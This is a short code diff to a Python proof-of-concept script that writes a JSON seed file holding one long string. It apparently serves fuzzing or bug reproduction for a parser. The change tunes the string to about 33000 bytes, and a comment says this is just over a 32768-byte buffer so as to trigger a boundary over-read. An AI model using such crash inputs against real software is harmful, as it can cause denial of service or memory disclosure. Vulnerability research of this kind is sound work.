@@ -3,8 +3,10 @@ import os
 import sys
 
 def generate_poc():
-    print("[*] Generating PoC (40KB flat string)...")
-    payload = '{"key": "' + ("A" * 40000) + '"}'
+    print("[*] Generating PoC (33KB flat string)...")
+    # Target size closer to 32768 (buffer size) to trigger off-by-one/boundary read
+    # instead of massive overflow. 33000 is just slightly over 32KB.
+    payload = '{"key": "' + ("A" * 33000) + '"}'
     with open("manual_seed.json", "w") as f:
         f.write(payload)
     print(f"    Created manual_seed.json ({len(payload)} bytes)")
